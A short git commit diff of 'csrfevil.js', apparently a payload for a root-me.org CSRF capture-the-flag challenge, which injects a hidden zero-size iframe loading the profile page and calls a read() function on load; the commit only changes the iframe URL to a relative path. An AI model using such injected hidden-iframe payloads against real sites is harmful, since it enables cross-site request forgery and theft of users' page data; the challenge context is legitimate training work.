1f06ae84369ccd36f8df24549cc2682635045d51
noobintheshell <>
2018-07-03 23:36:32 +0200

    t

--- csrfevil.js
+++ csrfevil.js
@@ -1,5 +1,5 @@
 alert("test CSRF");
-document.writeln('<iframe id="iframe" src="http://challenge01.root-me.org/web-client/ch23/index.php?action=profile" width="0" height="0" onload="read()"></iframe>');
+document.writeln('<iframe id="iframe" src="index.php?action=profile" width="0" height="0" onload="read()"></iframe>');
 function read()
 {
     alert("test iframe");
